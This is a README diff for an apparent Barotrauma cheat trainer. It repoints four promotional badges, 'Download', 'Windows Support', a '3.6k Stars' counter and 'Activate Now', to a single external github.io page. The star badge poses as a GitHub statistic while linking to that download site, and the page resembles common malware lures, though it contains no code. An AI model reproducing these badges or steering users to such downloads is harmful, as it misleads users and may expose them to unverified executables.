@@ -8,10 +8,10 @@ Deep beneath Europa’s icy oceans, *Barotrauma* challenges crews with constant 
 
 Barotrauma’s simulation-heavy design rewards creativity and preparation. The trainer amplifies those aspects by letting you tweak oxygen, stamina, health, and resources at will. Whether you want **stress-free exploration** or **a sandbox for mod testing**, this tool adapts to your playstyle.
 
-[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 3.6k Stars](https://img.shields.io/badge/GitHub-⭐️%203.6k%20Stars-black?style=for-the-badge\&logo=github)](#)
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
+[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](https://barotrauma-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://barotrauma-trainer.github.io/.github/)
+[![⭐️ 3.6k Stars](https://img.shields.io/badge/GitHub-⭐️%203.6k%20Stars-black?style=for-the-badge\&logo=github)](https://barotrauma-trainer.github.io/.github/)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://barotrauma-trainer.github.io/.github/)
 
 ---
 
